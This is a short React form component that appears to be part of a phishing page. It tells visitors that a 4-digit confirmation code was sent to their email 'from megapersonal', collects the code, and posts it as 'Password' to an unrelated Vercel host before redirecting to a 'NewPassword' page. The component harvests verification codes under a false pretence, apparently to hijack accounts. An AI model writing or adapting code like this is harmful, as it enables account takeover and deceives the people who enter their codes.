import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Code = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Password: data.exampleRequired,
    };
    fetch("https://hakim-meet-mega-sarver.vercel.app/code", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/NewPassword"));
  };
  return (
    <div>
      <div className="container">
        <div className="row">
          <div className="col text-center p-3">
            <h3>
              Confirmation 4 digit code sending to your email from megapersonal.
            </h3>
            <div>
              <form onSubmit={handleSubmit(onSubmit)}>
                <div>
                  <input
                    className="form-control Email mt-3 text-center"
                    placeholder="Type in the numbers you received"
                    defaultValue=""
                    {...register("exampleRequired", { required: true })}
                  />
                </div>
                {errors.exampleRequired && <span>This field is required</span>}

                <input
                  className="submit  mt-3 mb-3 w-50%"
                  type="SUBMIT"
                  defaultValue="Join Meeting"
                />
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Code;
